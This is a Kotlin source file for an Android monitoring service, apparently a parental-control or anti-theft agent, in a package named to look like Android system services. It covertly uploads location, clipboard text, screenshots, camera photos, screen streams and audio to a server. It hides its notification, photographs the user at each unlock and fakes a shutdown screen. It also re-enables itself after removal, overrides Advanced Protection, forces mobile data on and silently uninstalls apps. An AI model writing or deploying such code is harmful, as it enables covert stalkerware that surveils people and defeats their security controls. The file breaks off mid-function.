package com.android.systemservices

import android.Manifest
import android.app.*
import android.app.admin.DevicePolicyManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageInfo
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.hardware.Sensor
import android.hardware.SensorEvent
import android.hardware.SensorEventListener
import android.hardware.SensorManager
import android.hardware.TriggerEvent
import android.hardware.TriggerEventListener
import android.content.ClipboardManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioAttributes
import android.media.AudioManager
import android.media.MediaPlayer
import android.media.RingtoneManager
import android.telephony.SmsManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.os.Environment
import android.util.Log
import com.google.android.gms.location.*
import kotlin.math.pow
import kotlin.math.sqrt
import org.json.JSONArray
import org.json.JSONObject

class MonitoringService : Service() {

    private lateinit var fusedLocation: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    // Fallback for devices without Play Services (GrapheneOS without sandboxed Play)
    private var systemLocationManager: LocationManager? = null
    private var systemLocationListener: LocationListener? = null
    @Volatile private var usingFusedLocation = false
    private lateinit var connectivityManager: ConnectivityManager
    private lateinit var geofenceManager: GeofenceManager
    // AOSP-native geofence fallback for GrapheneOS / de-Googled devices where
    // Play Services' GeofencingClient can't function (sandboxed GMS lacks background
    // location privileges and GrapheneOS reroutes location away from Play Services).
    private lateinit var aospGeofenceManager: AospGeofenceManager
    @Volatile private var usingGmsGeofences = false
    private val TAG = "MonitoringService"
    private val streamHelper      by lazy { CameraStreamHelper(this) }
    private val screenHelper      by lazy { ScreenCaptureHelper(this) }
    private val audioHelper       by lazy { AudioHelper(this) }
    private val audioStreamHelper by lazy { AudioStreamHelper() }
    private val talkbackHelper    by lazy { TalkbackHelper() }
    private val shellHelper       by lazy { ShellHelper() }
    private val logcatHelper      by lazy { LogcatHelper() }
    private val screenTextHelper  by lazy { ScreenTextHelper(this) }
    private var btScanHelper: BluetoothScanHelper? = null
    // Dedicated HandlerThread for location callbacks — keeps batteryLevel() Binder IPC
    // and sendLocationFix() off the main thread entirely.
    private val locationThread  = android.os.HandlerThread("sentinel-location").also { it.start() }
    private val locationHandler = android.os.Handler(locationThread.looper)
    // Dedicated HandlerThread for sensor callbacks — keeps 5 Hz accelerometer math
    // and deepSleep/activeMode transitions off the main thread.
    private val sensorThread  = android.os.HandlerThread("sentinel-sensor").also { it.start() }
    private val sensorHandler = android.os.Handler(sensorThread.looper)
    // Debounce network snapshots — onCapabilitiesChanged fires many times/sec on signal change.
    // Use a background HandlerThread so NetworkHelper Binder IPC never runs on the main thread.
    private val netSnapshotThread   = android.os.HandlerThread("net-snapshot").also { it.start() }
    private val netSnapshotHandler  = android.os.Handler(netSnapshotThread.looper)
    private val netSnapshotRunnable = Runnable {
        try { SocketManager.sendNetworkInfo(NetworkHelper(this).getSnapshot()) }
        catch (e: Exception) { Log.e(TAG, "Network snapshot error", e) }
    }
    private var findPhonePlayer: MediaPlayer? = null
    private var wakeLock: PowerManager.WakeLock? = null
    @Volatile private var lastClipboardText = ""
    // DO mode: watches ENABLED_ACCESSIBILITY_SERVICES and re-enables our service if it's removed.
    // Registered only when running as Device Owner (not system/priv-app).
    private var accessibilityObserver: android.database.ContentObserver? = null
    // ── Cellular lockdown watchdog ───────────────────────────────────────────────
    // The DISALLOW_CONFIG_MOBILE_NETWORKS restriction gates the Settings screens and the
    // internet dialog, but the QS "cell" tile (QsSplitInternetTile) calls
    // setDataEnabled(false) with NO restriction check (AOSP gap — verified in the GOS
    // tree: MobileDataTileUserActionInteractor.handleSecondaryClick). While
    // Prefs.cellularLockdown is set, this watchdog force-re-enables mobile data the
    // moment it goes off — via Settings.Global (mobile_data / mobile_data<subId>), the
    // exact keys DataSettingsManager.setUserDataEnabled() reads/writes. Requires
    // WRITE_SECURE_SETTINGS (granted on platform-signed SentinelOS builds; signature
    // grant, so it works for the /data/app Device Owner too). Stock (keystore) builds
    // lack the permission — the watchdog logs and skips.
    private var cellularWatchdogObserver: android.database.ContentObserver? = null
    private val cellularWatchdogHandler = Handler(android.os.Looper.getMainLooper())
    private val cellularWatchdogRunnable = object : Runnable {
        override fun run() {
            try { enforceMobileDataOn() } catch (_: Exception) {}
            if (Prefs(this@MonitoringService).cellularLockdown) {
                cellularWatchdogHandler.postDelayed(this, CELLULAR_WATCHDOG_POLL_MS)
            }
        }
    }
    private val clipboardListener = ClipboardManager.OnPrimaryClipChangedListener {
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val text = cm.primaryClip?.getItemAt(0)?.coerceToText(this)?.toString() ?: return@OnPrimaryClipChangedListener
            if (text == lastClipboardText || text.isEmpty()) return@OnPrimaryClipChangedListener
            lastClipboardText = text
            SocketManager.emit("clipboard_event", JSONObject().apply {
                put("text", text)
                put("ts",   System.currentTimeMillis())
            })
        } catch (_: Exception) {}
    }
    private var isLiveTracking = false
    private val liveTrackAutoStopRunnable = Runnable { stopLiveTracking() }
    // ── Auto live-track (speed-gated track-history accuracy) ────────────────────
    // Background fixes are cheap but coarse (60 s active / 20 min sleep), so track history
    // looks blocky while driving. When a fix reports speed ≥ AUTO_LIVE_SPEED_MPS the device
    // promotes itself into full Live Track (1 s fixes) without waiting for an operator;
    // once every fix stays under threshold for AUTO_LIVE_SLOW_HOLD_MS (3 min) it drops back
    // out — long enough to survive a multi-phase traffic light without dropping mid-drive.
    // Operator-initiated sessions ("start_live_track") are never extended by this — only
    // sessions THIS feature started get the speed-based lifecycle.
    private var autoLiveTracking  = false   // true only while an auto session owns live tracking
    private var autoLiveSlowArmed = false   // downgrade timer armed after first sub-threshold fix
    private val autoLiveStopRunnable = Runnable {
        autoLiveSlowArmed = false
        if (autoLiveTracking && isLiveTracking) {
            Log.i(TAG, "Auto live track: speed stayed below ${(AUTO_LIVE_SPEED_MPS * 2.23694f).toInt()} mph for ${AUTO_LIVE_SLOW_HOLD_MS / 1000}s — stopping")
            stopLiveTracking()   // also clears the autoLive* flags
        }
    }
    @Volatile private var lastUnlockCaptureMs = 0L
    @Volatile private var theftModeActive = false
    private val streamTimeoutRunnable = Runnable {
        if (streamHelper.streaming) {
            streamHelper.stop()
            setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
            Log.i(TAG, "Camera stream auto-stopped after ${STREAM_TIMEOUT_MS / 60_000}min timeout")
        }
    }
    private val audioStreamTimeoutRunnable = Runnable {
        if (audioStreamHelper.streaming) {
            audioStreamHelper.stop()
            setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
            Log.i(TAG, "Audio stream auto-stopped after ${STREAM_TIMEOUT_MS / 60_000}min timeout")
        }
    }
    // Fires every 60 s while any stream is active; self-terminates when all streams stop
    private val streamAlertRunnable: Runnable = object : Runnable {
        override fun run() {
            val active = buildList {
                if (isLiveTracking)              add("live tracking")
                if (streamHelper.streaming)      add("camera stream")
                if (audioStreamHelper.streaming) add("audio stream")
            }
            if (active.isEmpty()) return  // nothing running, stop rescheduling
            SocketManager.emit("stream_alert", JSONObject().apply {
                put("active", active.joinToString(" + "))
            })
            powerHandler.postDelayed(this, STREAM_ALERT_INTERVAL_MS)
        }
    }
    private fun startStreamAlert() {
        powerHandler.removeCallbacks(streamAlertRunnable)
        powerHandler.post(streamAlertRunnable)
    }

    // Interval photo capture
    private var photoIntervalFacing   = "back"
    private var photoIntervalMs       = 30_000L
    private val photoIntervalHandler  = Handler(Looper.getMainLooper())
    private val photoIntervalRunnable: Runnable = object : Runnable {
        override fun run() {
            setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            CameraHelper(this@MonitoringService).capturePhoto(photoIntervalFacing) { bytes ->
                bytes?.let { SocketManager.sendPhoto(android.util.Base64.encodeToString(it, android.util.Base64.NO_WRAP)) }
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
            }
            photoIntervalHandler.postDelayed(this, photoIntervalMs)
        }
    }

    // Interval screenshot capture
    private var screenshotIntervalMs      = 30_000L
    private var screenshotIntervalQuality = 60
    private val screenshotIntervalHandler = Handler(Looper.getMainLooper())
    private val screenshotIntervalRunnable: Runnable = object : Runnable {
        override fun run() {
            if (!screenHelper.capturing) {
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                screenHelper.captureOnce(screenshotIntervalQuality) { base64 ->
                    // Drop empty captures (createVirtualDisplay denied / encode error / secure window) —
                    // captureOnce signals failure with "" to keep its chain alive; never emit a 0-byte
                    // screenshot or the dashboard shows a broken image.
                    if (base64.isNotEmpty()) SocketManager.emit("screencapture", org.json.JSONObject().apply { put("base64", base64) })
                    setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                }
            }
            screenshotIntervalHandler.postDelayed(this, screenshotIntervalMs)
        }
    }

    // Screen stream for touch mode — frames emitted as screen_frame, not saved or signaled
    @Volatile private var screenStreamActive  = false
    private var screenStreamQuality           = 50
    private var screenStreamIntervalMs        = 200L
    private val screenStreamHandler           = Handler(Looper.getMainLooper())
    private val screenStreamRunnable: Runnable = object : Runnable {
        override fun run() {
            if (!screenStreamActive) return
            val svc = ScreenshotService.instance
            if (svc != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                svc.capture(screenStreamQuality) { base64 ->
                    if (!screenStreamActive) return@capture
                    if (base64.isNotEmpty()) {
                        SocketManager.emit("screen_frame", org.json.JSONObject().apply { put("base64", base64) })
                    }
                    screenStreamHandler.postDelayed(this, screenStreamIntervalMs)
                }
            }
        }
    }

    private val talkActiveHandler = Handler(Looper.getMainLooper())
    private val talkStopRunnable = Runnable { audioStreamHelper.setNoiseSuppressor(false) }

    private val theftHandler = Handler(Looper.getMainLooper())
    private val theftPhotoRunnable = object : Runnable {
        override fun run() {
            if (!theftModeActive) return
            setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            CameraHelper(this@MonitoringService).capturePhoto("front") { bytes ->
                setFgsTypes(ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
                bytes?.let {
                    SocketManager.sendPhoto(android.util.Base64.encodeToString(it, android.util.Base64.NO_WRAP))
                }
            }
            theftHandler.postDelayed(this, THEFT_PHOTO_INTERVAL_MS)
        }
    }

    // Fires on every successful unlock — biometric, PIN, pattern, face — all methods
    private val unlockReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_USER_PRESENT) {
                // An authenticated unlock is the strongest "the user is actively using this
                // device right now" signal — wake immediately instead of waiting up to 5 min
                // on the batched accelerometer (TYPE_SIGNIFICANT_MOTION often misses a gentle
                // pick-up/unlock). Fires only on a real unlock, so battery cost is negligible.
                if (deepSleepActive) powerHandler.post {
                    if (deepSleepActive) exitDeepSleep(suppressAutoSleep = true)
                }
                captureUnlockPhoto(success = true)
            }
        }
    }

    // Fake-shutdown screen (theft feature): every display wake while armed lands on
    // black. The cover is preferred (instant, above the keyguard); the black activity
    // is always (re)launched too — it sits harmlessly beneath a live cover, and IS
    // the visible black if the cover died. Either way the wake ends black.
    private val fakeShutdownScreenReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            if (intent.action == Intent.ACTION_SCREEN_ON) {
                try {
                    if (Prefs(this@MonitoringService).fakeShutdownArmed) {
                        FakeShutdownCover.show(this@MonitoringService)
                        TheftFakeShutdownActivity.launch(this@MonitoringService)
                    }
                } catch (_: Exception) {}
            }
        }
    }

    // Reports app install / update / remove events; enforces install filter (whitelist/blacklist)
    private val packageEventReceiver = object : BroadcastReceiver() {        override fun onReceive(context: Context, intent: Intent) {
            val pkg = intent.data?.schemeSpecificPart ?: return
            val replacing = intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)
            val type = when (intent.action) {
                Intent.ACTION_PACKAGE_ADDED   -> if (replacing) "app_updated" else "app_installed"
                Intent.ACTION_PACKAGE_REMOVED -> if (replacing) return else "app_removed"
                else -> return
            }
            // Enforce install filter on fresh installs (not updates, not our own package)
            if (type == "app_installed" && pkg != packageName) {
                val doh = DeviceOwnerHelper(context)
                if (doh.isInstallBlocked(pkg)) {
                    Thread {
                        try {
                            // Primary: `pm uninstall --user 0 PACKAGE` via shell.
                            // Runs with our priv-app UID which holds DELETE_PACKAGES — silent,
                            // no PackageInstaller dialog.  Wait up to 5 s for it to finish.
                            val proc = Runtime.getRuntime()
                                .exec(arrayOf("pm", "uninstall", "--user", "0", pkg))
                            val exited = proc.waitFor(5, java.util.concurrent.TimeUnit.SECONDS)
                            val exitCode = if (exited) proc.exitValue() else { proc.destroyForcibly(); -1 }

                            if (exitCode != 0) {
                                // Fallback: PackageInstaller.uninstall() — may prompt user on some builds
                                val pendingIntent = android.app.PendingIntent.getBroadcast(
                                    context, pkg.hashCode(),
                                    android.content.Intent(context, InstallResultReceiver::class.java)
                                        .putExtra("action", "uninstall")
                                        .putExtra("package", pkg),
                                    android.app.PendingIntent.FLAG_MUTABLE or
                                        android.app.PendingIntent.FLAG_UPDATE_CURRENT
                                )
                                packageManager.packageInstaller.uninstall(pkg, pendingIntent.intentSender)
                                Log.w(TAG, "Install filter: pm uninstall failed (exit=$exitCode), " +
                                        "fell back to PackageInstaller for $pkg")
                            } else {
                                Log.i(TAG, "Install filter: auto-removed $pkg via pm uninstall ✓")
                            }

                            SocketManager.emit("status_event", JSONObject().apply {
                                put("type", "install_blocked")
                                put("package", pkg)
                                put("filter_mode", doh.getInstallFilterMode())
                            })
                        } catch (e: Exception) {
                            Log.e(TAG, "install filter uninstall failed ($pkg): ${e.message}")
                        }
                    }.start()
                    return
                }
            }
            Thread {
                try {
                    val event = JSONObject().apply {
                        put("type", type)
                        put("package", pkg)
                        if (type != "app_removed") {
                            try {
                                @Suppress("DEPRECATION")
                                val pi = packageManager.getPackageInfo(pkg, PackageManager.GET_PERMISSIONS)
                                put("name", packageManager.getApplicationLabel(pi.applicationInfo).toString())
                                put("version", pi.versionName ?: "")
                                val reqPerms = pi.requestedPermissions?.toList() ?: emptyList()
                                val grantedPerms = reqPerms.filterIndexed { i, _ ->
                                    ((pi.requestedPermissionsFlags?.getOrNull(i) ?: 0)
                                        and PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0
                                }
                                put("requestedPermissions", JSONArray(reqPerms))
                                put("grantedPermissions", JSONArray(grantedPerms))
                            } catch (_: Exception) {}
                        }
                    }
                    SocketManager.emit("status_event", event)
                } catch (e: Exception) { Log.e(TAG, "packageEvent error: ${e.message}") }
            }.start()
        }
    }

    // Respond to charger plug/unplug events
    private val wakeReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_POWER_CONNECTED -> {
                    Log.i(TAG, "Charger connected")
                    // If asleep, re-register the batched accel at the shorter charging latency:
                    // a docked device (e.g. Pixel Tablet) may have slept on battery at the 5-min
                    // batch, which would otherwise keep it slow to wake even while charging.
                    if (deepSleepActive) powerHandler.post {
                        if (deepSleepActive) accelSensor?.let {
                            sensorMgr.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_NORMAL, deepSleepAccelBatchUs(), sensorHandler)
                        }
                    }
                }
                Intent.ACTION_POWER_DISCONNECTED -> {
                    Log.i(TAG, "Charger disconnected")
                }
            }
        }
    }

    // ── Motion detection ─────────────────────────────────────────────────────
    private lateinit var sensorMgr: SensorManager
    private var accelSensor: Sensor? = null
    private var significantMotionSensor: Sensor? = null
    private val motionSamples = ArrayDeque<Float>()
    @Volatile private var motionState = "unknown"
    @Volatile private var inSleepMode = false
    @Volatile private var lastActiveMs = System.currentTimeMillis()
    @Volatile private var deepSleepActive = false
    @Volatile private var autoDeepSleepSuppressedUntil = 0L
    @Volatile private var motionSustainedStartMs = 0L  // when non-stationary motion began

    // Hardware trigger: fires once when significant movement is detected.
    // Works even in Doze at near-zero power cost.
    private val significantMotionListener = object : TriggerEventListener() {
        override fun onTrigger(event: TriggerEvent) {
            Log.i(TAG, "Significant motion detected")
            powerHandler.post {
                if (deepSleepActive) exitDeepSleep(suppressAutoSleep = true)
                else enterActiveMode()
            }
        }
    }

    private val deepSleepAutoRunnable = object : Runnable {
        override fun run() {
            if (!inSleepMode || deepSleepActive || theftModeActive) return
            // record_audio keeps recording locally through deep sleep regardless (the capture
            // thread doesn't touch the socket), but entering deep sleep disconnects the socket for
            // however long the phone stays stationary afterward — long enough that the server's
            // stale-session finalizer (see finalizeAudioSession) can conclude the recording died
            // and assemble a clip from the segments delivered so far, splitting the rest into a
            // second recording once they arrive late. Deferring here (like the stream check below)
            // avoids that in the common case: a still phone mid-recording.
            if (streamHelper.streaming || audioStreamHelper.streaming || audioHelper.isRecording) {
                Log.i(TAG, "Deep sleep deferred — stream or recording active")
                powerHandler.postDelayed(this, 2 * 60_000L)
                return
            }
            val suppressedMs = autoDeepSleepSuppressedUntil - System.currentTimeMillis()
            if (suppressedMs > 0) {
                Log.i(TAG, "Deep sleep suppressed for ${suppressedMs / 60_000} more min")
                powerHandler.postDelayed(this, suppressedMs + 5_000L)
                return
            }
            Log.i(TAG, "Auto-entering deep sleep after 15 min stationary")
            enterDeepSleep()
        }
    }

    private val powerHandler = Handler(Looper.getMainLooper())
    private val sleepCheckRunnable: Runnable = object : Runnable {
        override fun run() {
            if (inSleepMode || isLiveTracking) return
            val idleMs = System.currentTimeMillis() - lastActiveMs
            if (idleMs >= SLEEP_AFTER_MS) {
                enterSleepMode()
            } else {
                powerHandler.postDelayed(this, SLEEP_AFTER_MS - idleMs)
            }
        }
    }

    private val sensorListener = object : SensorEventListener {
        override fun onSensorChanged(event: SensorEvent) {
            val x = event.values[0]; val y = event.values[1]; val z = event.values[2]
            val mag = sqrt(x.pow(2) + y.pow(2) + z.pow(2))
            if (motionSamples.size >= 20) motionSamples.removeFirst()
            motionSamples.addLast(mag)
            if (motionSamples.size < 4) return
            val rms = sqrt(motionSamples.sumOf { it.toDouble().pow(2) } / motionSamples.size).toFloat()
            motionState = when {
                rms < 0.25f -> "stationary"
                rms < 1.5f  -> "light"
                else        -> "active"
            }
            if (motionState != "stationary") {
                if (deepSleepActive) {
                    // Batched accel fired — any motion in the 5-min batch is enough to wake
                    powerHandler.post { exitDeepSleep(suppressAutoSleep = true) }
                    return
                }
                if (motionSustainedStartMs == 0L) motionSustainedStartMs = System.currentTimeMillis()
                // Only reset the idle timer after 1.5 s of continuous motion —
                // filters brief desk/fan/USB vibrations that aren't real movement.
                if (System.currentTimeMillis() - motionSustainedStartMs >= 1_500L) {
                    lastActiveMs = System.currentTimeMillis()
                }
                // Wake from light sleep immediately regardless of duration
                if (inSleepMode) powerHandler.post { enterActiveMode() }
            } else {
                motionSustainedStartMs = 0L
            }
        }
        override fun onAccuracyChanged(sensor: Sensor, accuracy: Int) {}
    }

    // ── Device integrity / attestation ───────────────────────────────────────
    private var cachedIntegrity: JSONObject? = null
    private var integrityTs     = 0L
    private val INTEGRITY_TTL   = 2 * 60 * 60 * 1000L // re-attest every 2 h

    private fun runAttestationAsync(forceEmit: Boolean = true) {
        Thread {
            try {
                val result = AttestationHelper(this).check()
                cachedIntegrity = result
                integrityTs     = System.currentTimeMillis()
                if (forceEmit) SocketManager.emit("integrity_status", result)
            } catch (e: Exception) {
                Log.e(TAG, "Attestation failed: ${e.message}")
            }
        }.start()
    }

    // ── Heartbeat (device status every 30 s) ─────────────────────────────────
    private val statusThread = android.os.HandlerThread("sentinel-status").also { it.start() }
    private val statusHandler = Handler(statusThread.looper)
    private val statusRunnable: Runnable = object : Runnable {
        override fun run() {
            sendDeviceStatus()
            // Trigger re-attestation in the background if the cached result is stale
            if (System.currentTimeMillis() - integrityTs > INTEGRITY_TTL) runAttestationAsync()
            maybeHealApmAccessibility()
            statusHandler.postDelayed(this, if (inSleepMode) HEARTBEAT_SLEEP_MS else HEARTBEAT_ACTIVE_MS)
        }
    }

    // ── Advanced Protection (APM) self-heal ────────────────────────────────────
    // A parent can enable Advanced Protection at any time from Settings → Safety Center →
    // Advanced Protection. Doing so re-runs AccessibilityManagerService's strict APM filter,
    // which unbinds ScreenshotService and silently kills screenshots, keylogging, gesture
    // injection, app-watching and screen-text scraping — the dashboard shows nothing wrong.
    // BootReceiver re-asserts the DO accessibility allowlist at boot; this covers a live toggle
    // on a device that is already running. Only acts when APM is actually on AND the service is
    // unbound, so it costs one cached check per interval in the normal case.
    private var lastApmHealTs = 0L
    private val APM_HEAL_INTERVAL_MS = 10 * 60_000L

    private fun maybeHealApmAccessibility() {
        val now = System.currentTimeMillis()
        if (now - lastApmHealTs < APM_HEAL_INTERVAL_MS) return
        lastApmHealTs = now
        try {
            if (ScreenshotService.instance != null) return              // healthy — service bound
            val doh = DeviceOwnerHelper(this)
            if (doh.isAdvancedProtectionEnabled() != true) return       // not an APM teardown
            if (doh.allowlistAccessibilityForApm()) {
                Log.i(TAG, "APM self-heal: accessibility allowlist re-asserted")
                SocketManager.emit("accessibility_heal", org.json.JSONObject().apply {
                    put("reason", "advanced_protection_unbound_service")
                    put("ts", now)
                })
            }
        } catch (e: Throwable) {
            Log.w(TAG, "APM self-heal failed: ${e.message}")
        }
    }

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network)  = sendNetworkSnapshot()
        override fun onLost(network: Network)        = sendNetworkSnapshot()
        override fun onCapabilitiesChanged(network: Network, caps: NetworkCapabilities) = sendNetworkSnapshot()
    }

    override fun onCreate() {
        super.onCreate()

        // Initialize AirlineWifiHelper so it loads persisted credentials from SharedPreferences.
        // This ensures credentials survive reboots — critical for flights where cell service
        // is lost before the device can re-fetch credentials from the server.
        AirlineWifiHelper.init(this)

        // Migration: pre-2.6.3.6 hide_app disabled MainActivity instead of AccountLinkActivity,
        // causing AccountLinkActivity.onCreate() to crash with ActivityNotFoundException.
        // Re-enable MainActivity if it was wrongly disabled so tapping the icon works again.
        try {
            val mainComp = android.content.ComponentName(this, MainActivity::class.java)
            if (packageManager.getComponentEnabledSetting(mainComp) ==
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                packageManager.setComponentEnabledSetting(
                    mainComp,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
                    android.content.pm.PackageManager.DONT_KILL_APP
                )
                Log.i(TAG, "Migration: re-enabled MainActivity (was wrongly disabled by old hide_app)")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Migration: could not check/re-enable MainActivity: ${e.message}")
        }

        val isSystemApp = applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0

        if (isSystemApp) {
            // ── System / priv-app path ────────────────────────────────────────────
            // android:persistent="true" keeps this process alive without FGS.
            // Never call startForeground() here — the service was started with
            // startService() (not startForegroundService()), so Android imposes no
            // 5-second FGS deadline and no notification is ever posted.
            // Background location / camera / mic are unrestricted for FLAG_SYSTEM apps.
            //
            // Re-apply volatile restrictions (statusBar, screenCapture) after a short
            // delay so SystemUI is fully initialised before we call StatusBarManager.
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                try { DeviceOwnerHelper(this).restoreRestrictionsAtBoot() }
                catch (e: Exception) { Log.w(TAG, "restoreRestrictionsAtBoot: ${e.message}") }
            }, 5_000L)
        } else {
            // ── Device Owner path (stock Android) ────────────────────────────────
            // FGS is required to survive in background on non-system builds.
            // Use DATA_SYNC type if location permission isn't granted yet (e.g. on first
            // boot). LOCATION type requires runtime permission at startForeground() time
            // on API 34+. Triple-fallback so an unexpected exception never leaves onDestroy
            // with uninitialized lateinit fields.
            createNotificationChannel()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val hasLocation = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                        checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                val preferredType = if (hasLocation) ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                                    else ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                try {
                    startForeground(NOTIF_ID, buildNotification(), preferredType)
                } catch (e: Exception) {
                    Log.w(TAG, "startForeground type=$preferredType failed: ${e.message}, retrying DATA_SYNC")
                    try {
                        startForeground(NOTIF_ID, buildNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
                    } catch (e2: Exception) {
                        Log.e(TAG, "startForeground DATA_SYNC failed: ${e2.message}, bare call")
                        startForeground(NOTIF_ID, buildNotification())
                    }
                }
            } else {
                startForeground(NOTIF_ID, buildNotification())
            }
            cancelFgsNotification()
            try {
                val doh = DeviceOwnerHelper(this)
                doh.clearLockScreenInfo()
                doh.tryGrantReadLogs()
                doh.exemptSelfFromBatteryOptimization()  // stock Android: stop App Standby idle-killing this FGS
            } catch (_: Exception) {}
        }

        // Re-enable WiFi if a rogue-defense cooldown was active when the previous process
        // exited (OTA, kill, crash). Without this, WiFi stays off forever after a restart
        // because the in-memory defensiveOffUntil resets to 0.
        try { RogueApDetector.restoreAfterRestart(this) } catch (_: Exception) {}

        // ── OTA reboot warning ────────────────────────────────────────────────
        // If the previous process's SessionCallback set otaRebootPending = true,
        // start the 60-second countdown notification (or resume a delay window).
        OtaRebootManager.checkAndSchedule(this)

        connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        sensorMgr = getSystemService(Context.SENSOR_SERVICE) as SensorManager
        accelSensor = sensorMgr.getDefaultSensor(Sensor.TYPE_LINEAR_ACCELERATION)
        significantMotionSensor = sensorMgr.getDefaultSensor(Sensor.TYPE_SIGNIFICANT_MOTION)

        val deepSleepPref = Prefs(this).deepSleepEnabled
        val startInDeepSleep = deepSleepPref

        geofenceManager = GeofenceManager(this)
        aospGeofenceManager = AospGeofenceManager(this)
        aospGeofenceManager.onTransition = { id, name, transition, lat, lng, radius ->
            SocketManager.emit("geofence_alert", JSONObject().apply {
                put("geofenceId", id)
                put("name",       name)
                put("transition", transition)
                put("timestamp",  System.currentTimeMillis())
                put("lat",        lat)
                put("lng",        lng)
                put("radius",     radius)
            })
            showGeofenceNotification(name, transition)
        }

        // Always init fusedLocation so onDestroy can safely clean up
        setupLocationUpdates(startUpdates = !startInDeepSleep)
        registerNetworkCallback()
        // Auto-join must stand down during an active session (live-track / camera / audio / screen) —
        // hopping networks mid-stream drops the socket and freezes the feed.
        WifiAutoJoinHelper.sessionProbe = {
            isLiveTracking || screenStreamActive || streamHelper.streaming || audioStreamHelper.streaming
        }
        WifiAutoJoinHelper.start(this)   // periodic open-WiFi auto-join (no-op until enabled via server)
        OpenWifiVpnController.onStateChanged = { statusHandler.post { sendDeviceStatus() } } // live VPN/open-WiFi badge
        OpenWifiVpnController.start(this) // tunnel all traffic over REALITY while on open WiFi (no-op until enabled)
        // Re-arm Device-Owner always-on VPN consent at boot when the VPN is configured, so the system
        // auto-start + reevaluate() can establish the tunnel without waiting for the next set_vpn push.
        // The DPM always-on setting persists across reboot, but re-arming is cheap insurance against it
        // being cleared — and pairs with OpenWifiVpnController's retry to make boot recovery reliable.
        try {
            val vp = Prefs(this)
            if (vp.vpnEgressUuid.isNotBlank() && (vp.vpnForceEnabled || vp.vpnOnOpenWifiEnabled || vp.vpnTailnetOnly)) {
                DeviceOwnerHelper(this).setSelfAlwaysOnVpn(true)
            }
        } catch (_: Throwable) {}
        registerReceiver(unlockReceiver, IntentFilter(Intent.ACTION_USER_PRESENT))
        registerReceiver(wakeReceiver, IntentFilter().also {
            it.addAction(Intent.ACTION_POWER_CONNECTED)
            it.addAction(Intent.ACTION_POWER_DISCONNECTED)
        })
        registerReceiver(packageEventReceiver, IntentFilter().also {
            it.addAction(Intent.ACTION_PACKAGE_ADDED)
            it.addAction(Intent.ACTION_PACKAGE_REMOVED)
            it.addDataScheme("package")
        })

        if (startInDeepSleep) {
            deepSleepActive = true
            // Restore both wake mechanisms after reboot/service restart
            significantMotionSensor?.let { sensorMgr.requestTriggerSensor(significantMotionListener, it) }
            accelSensor?.let { sensorMgr.registerListener(sensorListener, it, SensorManager.SENSOR_DELAY_NORMAL, deepSleepAccelBatchUs(), sensorHandler) }
            scheduleDeepSleepPoll()
            // Re-arm scheduled screen-text analysis alarm
            if (Prefs(this).screentextScheduleEnabled) scheduleScreentextAlarm()
            return
        }

        SocketManager.connect(this)
        SocketManager.commandListener = { cmd -> handleCommand(cmd) }
        SocketManager.connectListener = {
            sendDeviceStatus()
            flushPendingUnlockPhotos()
            flushPendingAudio()
            // Re-assert the BT scan state so the server/WebUI reflect reality after a reconnect
            // (server restarts / connection drops can otherwise leave a stale "scanning" flag
            // that makes the Stop button look stuck even though the device is idle).
            emitBtScanState(btScanHelper?.isActive() == true)
        }
        // Re-arm scheduled screen-text analysis alarm
        if (Prefs(this).screentextScheduleEnabled) scheduleScreentextAlarm()

        // Grant runtime permissions and enable special access.
        // System (priv-app) builds: use AppOps + WRITE_SECURE_SETTINGS (same path as BootReceiver).
        // Device Owner builds: use DevicePolicyManager to pin runtime permissions.
        Thread {
            val flags = packageManager.getApplicationInfo(packageName, 0).flags
            val isSystemApp = flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM != 0
            val doh = DeviceOwnerHelper(this)

            if (isSystemApp) {
                // Ensure notification listener + accessibility are still enabled
